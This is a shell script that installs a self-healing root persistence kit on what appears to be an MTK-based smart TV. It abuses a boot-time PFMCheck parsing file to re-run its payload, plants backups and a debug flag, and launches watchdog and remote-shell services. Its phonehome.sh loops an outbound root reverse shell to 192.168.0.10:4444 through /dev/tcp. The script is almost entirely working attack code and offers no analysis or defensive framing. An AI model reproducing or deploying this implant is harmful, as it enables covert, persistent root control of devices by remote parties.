export PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin
BB=/usr/local/bin/busybox

echo "=== BOOT.SH v2 (self-healing) ==="
cat > /var/local/alvidaa/boot.sh <<'BOOT_EOF'
#!/bin/sh
# alvidaa boot persistence (uid 0). Called from the PFM lane after boot:
#   sh /var/local/alvidaa/boot.sh            -> start services
#   sh /var/local/alvidaa/boot.sh replant    -> restore the PFM gate only
BB=/usr/local/bin/busybox
LOG=/var/local/alvidaa/boot.log
export PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin
say() { echo "$(date) $*" >> "$LOG"; }

replant() {
    mkdir -p /var/local/pfmParse/Data 2>/dev/null
    cat > /var/local/pfmParse/PFMCheck <<'PFM_EOF'
runSignal=PFM
runCount=99
runMaxCount=1
mkdir -p /var/local/alvidaa
{ /usr/local/bin/busybox id; date; cat /proc/uptime; } > /var/local/alvidaa/proof.txt 2>&1
chmod 755 /var/local/alvidaa; chmod 644 /var/local/alvidaa/proof.txt 2>/dev/null
cp -f /var/local/pfmParse/PFMCheck /var/local/alvidaa/PFMCheck.bak 2>/dev/null; cp -f /var/local/pfmParse/Data/platform.txt /var/local/alvidaa/platform.bak 2>/dev/null; chmod 644 /var/local/alvidaa/PFMCheck.bak /var/local/alvidaa/platform.bak 2>/dev/null
echo "alvidaa payload ran $(date) uid=$(/usr/local/bin/busybox id -u)" >> /var/local/alvidaa/payload.log 2>/dev/null
( sleep 25; /bin/sh /var/local/alvidaa/boot.sh ) >/dev/null 2>&1 &
( sleep 45; /bin/sh /var/local/alvidaa/watchdog.sh ) >/dev/null 2>&1 &
( sleep 40; /bin/sh /var/local/alvidaa/boot.sh replant ) >/dev/null 2>&1 &
sync
PFM_EOF
    cat > /var/local/pfmParse/Data/platform.txt <<'PLAT_EOF'
osPlatform=mtk9618
osModel=65A85QEVS
osVersion=V0000.09.60A.Q0602
osDebugVersion=0
osChannel=1
osFormat=1
logLimitTime=0
bootPaddingTime=0
signalList=dtv-launcher
runMaxCount=1
userAction=now
PLAT_EOF
    cp -f /var/local/pfmParse/PFMCheck /var/local/alvidaa/PFMCheck.bak 2>/dev/null
    cp -f /var/local/pfmParse/Data/platform.txt /var/local/alvidaa/platform.bak 2>/dev/null
    touch /var/local/DebugPowerup
    chmod 644 /var/local/pfmParse/PFMCheck /var/local/pfmParse/Data/platform.txt \
              /var/local/DebugPowerup /var/local/alvidaa/PFMCheck.bak \
              /var/local/alvidaa/platform.bak 2>/dev/null
    sync
    say "replant done"
}

start() {
    ps 2>/dev/null | grep -v grep | grep -q 'rshell\.sh' || {
        $BB setsid /bin/sh /var/local/alvidaa/rshell.sh >/dev/null 2>&1 < /dev/null &
        say "rshell started pid=$!"
    }
    ps 2>/dev/null | grep -v grep | grep -q 'phonehome\.sh' || {
        $BB setsid /bin/sh /var/local/alvidaa/phonehome.sh >/dev/null 2>&1 < /dev/null &
        say "phonehome started pid=$!"
    }
    ps 2>/dev/null | grep -v grep | grep -q 'watchdog\.sh' || {
        $BB setsid /bin/sh /var/local/alvidaa/watchdog.sh >/dev/null 2>&1 < /dev/null &
        say "watchdog started pid=$!"
    }
    [ -f /var/local/pfmParse/PFMCheck ] || replant
    [ -f /var/local/DebugPowerup ] || { touch /var/local/DebugPowerup; chmod 644 /var/local/DebugPowerup; }
    sleep 3
    say "listen8008=$(grep -ci ':1F48' /proc/net/tcp 2>/dev/null) boot.sh done"
}

case "$1" in
    replant) replant ;;
    *) say "boot.sh start uptime=$(cut -d' ' -f1 /proc/uptime 2>/dev/null)"; start ;;
esac
BOOT_EOF
chmod 755 /var/local/alvidaa/boot.sh

echo "=== PHONEHOME (singleton) ==="
cat > /var/local/alvidaa/phonehome.sh <<'PH_EOF'
#!/bin/sh
# Outbound root shell to the LAN host, singleton.
LOCK=/var/local/alvidaa/phonehome.lock
if [ -f "$LOCK" ]; then
    old=$(cat "$LOCK" 2>/dev/null)
    if [ -n "$old" ] && kill -0 "$old" 2>/dev/null; then exit 0; fi
fi
echo $$ > "$LOCK"
trap 'rm -f "$LOCK"' EXIT INT TERM
while true; do
    /bin/bash -c "exec 3<>/dev/tcp/192.168.0.10/4444 && exec /bin/sh <&3 >&3 2>&3" 2>/dev/null
    sleep 5
done
PH_EOF
chmod 755 /var/local/alvidaa/phonehome.sh

echo "=== KILL OLD PHONEHOME LOOPS ==="
ps 2>/dev/null | grep -v grep | grep 'phonehome\.sh' | awk '{print $1}' | while read p; do
    kill -9 "$p" 2>/dev/null && echo "killed $p"
done
rm -f /var/local/alvidaa/phonehome.lock
rm -f /APPS/.alvidaa/phonehome.sh

echo "=== SEED GATE FROM BOOT.SH ==="
/bin/sh /var/local/alvidaa/boot.sh replant
ls -l /var/local/pfmParse/PFMCheck /var/local/pfmParse/Data/platform.txt /var/local/DebugPowerup
head -3 /var/local/pfmParse/PFMCheck

echo "=== START SERVICES ==="
$BB setsid /bin/sh /var/local/alvidaa/phonehome.sh >/dev/null 2>&1 < /dev/null &
sleep 2
$BB ps | grep -E 'rshell|phonehome|watchdog' | grep -v grep
echo "=== DONE ==="
exit
